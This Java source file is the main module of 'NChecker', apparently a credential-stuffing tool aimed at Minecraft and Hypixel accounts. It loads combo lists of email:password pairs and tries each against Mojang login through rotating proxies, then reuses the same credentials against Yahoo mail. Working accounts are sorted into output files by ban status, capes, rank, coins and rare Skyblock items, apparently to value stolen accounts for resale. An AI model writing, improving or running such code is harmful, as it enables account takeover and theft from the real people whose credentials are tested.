package dev.tolja.Checkers.Modules;

import dev.tolja.Checkers.Checker;
import dev.tolja.Checkers.OutputManager;
import dev.tolja.Configuration.ConfigManager;
import dev.tolja.Data.HypixelProfile;
import dev.tolja.Data.MojangAccount;
import dev.tolja.Data.ProxyInfo;
import dev.tolja.Nchecker;
import dev.tolja.Utils.*;
import dev.tolja.Utils.BannedUtils.BannedType;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.AnsiConsole;
import org.fusesource.jansi.internal.Kernel32;

import java.io.File;
import java.net.Proxy;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class HypixelChecker extends Checker {
    private final AtomicInteger checked = new AtomicInteger();
    private final AtomicInteger banned = new AtomicInteger();
    private final AtomicInteger unbanned = new AtomicInteger();
    private final AtomicInteger error = new AtomicInteger();
    private final AtomicInteger failed = new AtomicInteger();
    private final AtomicInteger fails = new AtomicInteger();
    private final AtomicInteger hits = new AtomicInteger();
    private final AtomicInteger NFA = new AtomicInteger();
    private final AtomicInteger SFA = new AtomicInteger();
    private final AtomicInteger MFA = new AtomicInteger();
    private final AtomicInteger leveled1 = new AtomicInteger();
    private final AtomicInteger leveled10 = new AtomicInteger();
    private final AtomicInteger leveled20 = new AtomicInteger();
    private final AtomicInteger ranked = new AtomicInteger();
    private final AtomicInteger OFcape = new AtomicInteger();
    private final AtomicInteger mineconcape = new AtomicInteger();
    private final AtomicInteger ELetterName = new AtomicInteger();
    private final AtomicInteger mw = new AtomicInteger();
    private final AtomicInteger UHCbasic = new AtomicInteger();
    private final AtomicInteger UHCtopest = new AtomicInteger();
    private final AtomicInteger Dragon = new AtomicInteger();
    private final AtomicInteger TopestWeapon = new AtomicInteger();
    private final AtomicInteger TopestSet = new AtomicInteger();
    private final AtomicInteger Greatthing = new AtomicInteger();
    private final AtomicInteger data = new AtomicInteger();

    @Override
    public void runChecker() {
        ConfigManager configManager = Nchecker.getConfigManager();
        Object[] resources = IOUtils.loadResources(true, configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT, false);
        if (resources == null) return;
        List<ProxyInfo> proxies = (List<ProxyInfo>) resources[0];
        List<MojangAccount> combos = (List<MojangAccount>) resources[1];
        List<String> apiKeys = (List<String>) resources[2];
        OutputManager outputManager = new OutputManager(new File(".", "results/HypxielChecker/"), "5");
        long startTime = System.currentTimeMillis();
//        Kernel32.SetConsoleTitle("NChecker | Starting thread...");
        ExecutorService threadPool = Executors.newFixedThreadPool(configManager.getSettingsConfig().getThreads());

        // 开始
        for (MojangAccount account : combos) {
            threadPool.submit(new Runnable() {
                @Override
                public void run() {
                    int recheckCount = 0;
                    do {
                        if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null);
                        } else {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout());
                        }
                    } while (!account.isCracked() && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);
                    if (account.isCracked()) {
                        recheckCount = 0;
                        hits.getAndIncrement();
                        outputManager.writeLine("Hits.txt", account.getAccount() + ":" + account.getPassword());
                        account.setSecurity(MojangUtils.isSFA(account, configManager.getSettingsConfig().getTimeout()));
                        AnsiConsole.out().println(Ansi.ansi().fgBrightGreen().a("[" + (account.isSecurity() ? "NFA" : "SFA") + "] " + account.getAccount() + ":" + account.getPassword()).reset());
                        if (account.isSecurity()) {
                            NFA.getAndIncrement();
                            outputManager.writeLine("NFA.txt", account.getAccount() + ":" + account.getPassword());
                        } else {
                            SFA.getAndIncrement();
                            outputManager.writeLine("SFA.txt", account.getAccount() + ":" + account.getPassword());
                        }
                        if (account.getPlayerName().length() <= 3) {
                            account.setELetterName(true);
                        }
                        if (CapeUtils.checkOf(account.getPlayerName())) {
                            account.setCapetype("Optifine");
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Of cape]" + account.getAccount() + account.getPassword()).reset());
                            outputManager.writeLine("Optifine.txt", account.getAccount() + ":" + account.getPassword());
                            OFcape.getAndIncrement();
                        }

                        if (CapeUtils.checkMinecon(account.getUuid(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null)) {
                            account.setCapetype(account.getCapetype() == null || account.getCapetype().equalsIgnoreCase("") ? "+Minecon" : "Minecon");
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Minecon cape]" + account.getAccount() + account.getPassword()).reset());
                            mineconcape.getAndIncrement();
                            outputManager.writeLine("Minecon.txt", account.getAccount() + ":" + account.getPassword());
                        }

                        if (YahooUtils.checkYahoo(account.getAccount(),account.getPassword(),configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null)) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[MFA]" + account.getAccount() + account.getPassword()).reset());
                            MFA.getAndIncrement();
                            outputManager.writeLine("MFA.txt", account.getAccount() + ":" + account.getPassword());
                        }
                        BannedType bt;
                        if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                            ProxyInfo proxy = proxies.get(new Random().nextInt(proxies.size()));
                            bt = BannedUtils.isBanned(account.getPlayerName(),  account.getAccessToken(), account.getUuid(), proxy);
                        } else {
                            bt = BannedUtils.isBanned(account.getPlayerName(),  account.getAccessToken(), account.getUuid(), null);
                        }
                        if (bt == BannedType.ERROR) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightRed().a("[Error] " + account.getAccount() + ":" + account.getPassword()).reset());
                            outputManager.writeLine("Error.txt", account.getAccount() + ":" + account.getPassword());
                            error.getAndIncrement();
                        } else if (bt == BannedType.OTHERBAN) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Banned] " + account.getAccount() + ":" + account.getPassword()).reset());
                            outputManager.writeLine("OtherBanned.txt", account.getAccount() + ":" + account.getPassword());
                            banned.getAndIncrement();
                        } else if (bt == BannedType.IPBAN) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Banned] " + account.getAccount() + ":" + account.getPassword()).reset());
                            outputManager.writeLine("Ipbanned.txt", account.getAccount() + ":" + account.getPassword());
                            banned.getAndIncrement();
                        } else if (bt == BannedType.UNBANNED) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Unban] " + account.getAccount() + ":" + account.getPassword()).reset());
                            outputManager.writeLine("Unban.txt", account.getAccount() + ":" + account.getPassword());
                            unbanned.getAndIncrement();
                            HypixelProfile hypixelProfile = null;
                            account.setSecurity(MojangUtils.isSFA(account, configManager.getSettingsConfig().getTimeout()));
                            List<String> profiles = HypixelUtils.skyblockProfile(apiKeys.get(new Random().nextInt(apiKeys.size())), account.getUuid(), configManager.getSettingsConfig().getTimeout(), null);
                            for(int i = 0; i < profiles.size(); ++i) {
                                if (i != 0) {
                                    String profile = profiles.get(i);
                                    if (profile != null && !profile.equals("")) {
                                        try {
                                            do {
                                                hypixelProfile = HypixelUtils.getskyblockProfile(profile,account.getUuid(),apiKeys.get(new Random().nextInt(apiKeys.size())), configManager.getSettingsConfig().getTimeout(),null);
                                            } while (hypixelProfile == null && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);
                                        } catch (Exception e) {
                                        }
                                        if (hypixelProfile != null) {
                                            if (hypixelProfile.getSkyblockCoins() >= 10000000) {
                                                AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Coins 10m+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("coins 10m+.txt", account.getAccount() + ":" + account.getPassword());
                                            }
                                            if (hypixelProfile.getSkyblockArmor().contains("Hyperion") | hypixelProfile.getSkyblockArmor().contains("Scylla") | hypixelProfile.getSkyblockArmor().contains("Valkyrie") | hypixelProfile.getSkyblockArmor().contains("Astraea")) {
                                                TopestWeapon.getAndIncrement();
                                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[TopestWeapon] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("TopestWeapon.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                            } else if (hypixelProfile.getSkyblockArmor().contains("Goldor's") | hypixelProfile.getSkyblockArmor().contains("Necron") | hypixelProfile.getSkyblockArmor().contains("Storm's") | hypixelProfile.getSkyblockArmor().contains("Maxor's") | hypixelProfile.getSkyblockArmor().contains("Warden Helmet") | hypixelProfile.getSkyblockArmor().contains("Diamond Necron Head")) {
                                                TopestSet.getAndIncrement();
                                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[TopestSet] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("TopestSet.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                            } else if (hypixelProfile.getSkyblockArmor().contains("Elegant Tuxedo") | hypixelProfile.getSkyblockArmor().contains("Shadow Assassin") | hypixelProfile.getSkyblockArmor().contains("Axe Of The Shredded") | hypixelProfile.getSkyblockArmor().contains("Giant's Sword") | hypixelProfile.getSkyblockArmor().contains("Daedalus Axe") | hypixelProfile.getSkyblockArmor().contains("Hegemony Artifact")) {
                                                Greatthing.getAndIncrement();
                                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[GreatThing] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("GreatThing.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                            } else if (hypixelProfile.getSkyblockArmor().contains("Dragon")) {
                                                Dragon.getAndIncrement();
                                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Dragon] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("Dragon.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                            } else if (hypixelProfile.getSkyblockArmor().length() >= 6) {
                                                data.getAndIncrement();
                                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Profile] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("Profile.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "coins:" + hypixelProfile.getSkyblockCoins() + " armors:" + hypixelProfile.getSkyblockArmor());
                                            } else {
                                                AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.CYAN).a("[null] " + account.getAccount() + ":" + account.getPassword()).reset());
                                                outputManager.writeLine("null.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + hypixelProfile.getSkyblockArmor());
                                            }
                                        } else {
                                            AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.CYAN).a("[null] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine("null.txt", account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName());
                                        }
                                    }
                                }
                            }
                            if (configManager.getSettingsConfig().isHypixelCheck()) {
                                do {
                                    hypixelProfile = HypixelUtils.getHypixelProfile(apiKeys.get(new Random().nextInt(apiKeys.size())), account.getUuid(), configManager.getSettingsConfig().getTimeout(), null);
                                } while (hypixelProfile == null && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);
                                if (configManager.getSettingsConfig().isHypixelJson()) {
                                    System.out.println(hypixelProfile);
                                }
                                if (hypixelProfile != null) {
                                    if (hypixelProfile.getUhcBasic() && configManager.getSettingsConfig().isCheckUHC()) {
                                        UHCbasic.getAndIncrement();
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[Hypixel UHCbasic] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]UHCbasic.txt" : "[SFA]UHCbasic.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    } else if (hypixelProfile.getUhcTopest() && configManager.getSettingsConfig().isCheckUHC()) {
                                        UHCtopest.getAndIncrement();
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[Hypixel UHCtopest] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]UHCtopest.txt" : "[SFA]UHCtopest.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    } else if (account.isELetterName()) {
                                        ELetterName.getAndIncrement();
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[3LetterName] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]3LetterName.txt" : "[SFA]3LetterName.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    } else if (hypixelProfile.getMwcoins() >= 15000 && configManager.getSettingsConfig().isCheckMW()) {
                                        mw.getAndIncrement();
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[MW] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]MW.txt" : "[SFA]MW.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    } else if (hypixelProfile.getNetworkLevel() > configManager.getSettingsConfig().getMaxLevel() && configManager.getSettingsConfig().isCheckLeveled()) {
                                        leveled20.getAndIncrement();
                                        if (hypixelProfile.getHypixelRank() != null && configManager.getSettingsConfig().isCheckRanked()) {
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel " + hypixelProfile.getHypixelRank() + "20+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine((account.isSecurity() ? "[NFA]" + hypixelProfile.getHypixelRank() + "_Leveled 20+.txt" : "[SFA]" + hypixelProfile.getHypixelRank() + "_Leveled 20+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                            ranked.getAndIncrement();
                                        } else {
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel 20+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine((account.isSecurity() ? "[NFA]Leveled 20+.txt" : "[SFA]Leveled 20+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                        }
                                    } else if (hypixelProfile.getNetworkLevel() > configManager.getSettingsConfig().getMinLevel() && configManager.getSettingsConfig().isCheckLeveled()) {
                                        leveled10.getAndIncrement();
                                        if (hypixelProfile.getHypixelRank() != null && configManager.getSettingsConfig().isCheckRanked()) {
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel " + hypixelProfile.getHypixelRank() + "10+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine((account.isSecurity() ? "[NFA]" + hypixelProfile.getHypixelRank() + "_Leveled 10+.txt" : "[SFA]" + hypixelProfile.getHypixelRank() + "_Leveled 10+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                            ranked.getAndIncrement();
                                        } else {
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightBlue().a("[Hypixel 10+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine((account.isSecurity() ? "[NFA]Leveled 10+.txt" : "[SFA]Leveled 10+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                        }
                                    } else {
                                        leveled1.getAndIncrement();
                                        if (hypixelProfile.getHypixelRank() != null && configManager.getSettingsConfig().isCheckRanked()) {
                                            AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel " + hypixelProfile.getHypixelRank() + "1+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                            outputManager.writeLine((account.isSecurity() ? "[NFA]" + hypixelProfile.getHypixelRank() + "_Leveled 1+.txt" : "[SFA]" + hypixelProfile.getHypixelRank() + "_Leveled 1+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                            ranked.getAndIncrement();
                                        } else {
                                            outputManager.writeLine((account.isSecurity() ? "[NFA]Leveled 1+.txt" : "[SFA]Leveled 1+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                        }
                                    }
                                } else {
                                    AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.GREEN).a("[" + (account.isSecurity() ? "NFA" : "SFA") + "_NoLogin] " + account.getAccount() + ":" + account.getPassword()).reset());
                                    outputManager.writeLine((account.isSecurity() ? "NFA_Nologin.txt" : "SFA_Nologin.txt"), account.getAccount() + ":" + account.getPassword());
                                }
                            }
                        }

                    } else {
                        if (configManager.getSettingsConfig().isPrintFailed()) {
                            AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.RED).a("[Failed] " + account.getAccount() + ":" + account.getPassword()).reset());
                        }
                        if (configManager.getSettingsConfig().isSaveFailed()) {
                            outputManager.writeLine("Failed.txt", account.getAccount() + ":" + account.getPassword());
                            failed.getAndIncrement();
                        }
                    }
                    checked.getAndIncrement();
                }
            });
        }
        threadPool.shutdown();
        SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        while (!threadPool.isTerminated()) {
            try {
                int time = (int) ((System.currentTimeMillis() - startTime) / 1000);
                Kernel32.SetConsoleTitle("NChecker"
                        + " | Checked: " + checked.get() + "/" + combos.size() + " (" + String.format("%.2f", (double) checked.get() / combos.size() * 100) + "%)"
                        + " | Hits: " + hits.get() + " - " + "Unban: " + unbanned.get() + "| Cpm: " + (int) Math.ceil((double) checked.get() / time * 60)
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000))));
                Thread.sleep(1000);
            } catch (Exception ignored) {
            }
        }
        Kernel32.SetConsoleTitle("NChecker | Ver " + Nchecker.VERSION);
        AnsiConsole.out.println(Ansi.ansi().fg(Ansi.Color.CYAN).a(
                "\r\nAll done.\r\n"
                        + " | Hits: " + hits.get() + " - " + "Unban: " + unbanned.get() + " - " + "Error: " + error.get()
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000)))
        ).reset());
        AnsiConsole.out.println(Ansi.ansi().fgBrightYellow().a("Unbanned: " +unbanned.get() + "\r\n" +
                "Banned: " + banned.get() + "\r\n"
        ).reset());
    }
}
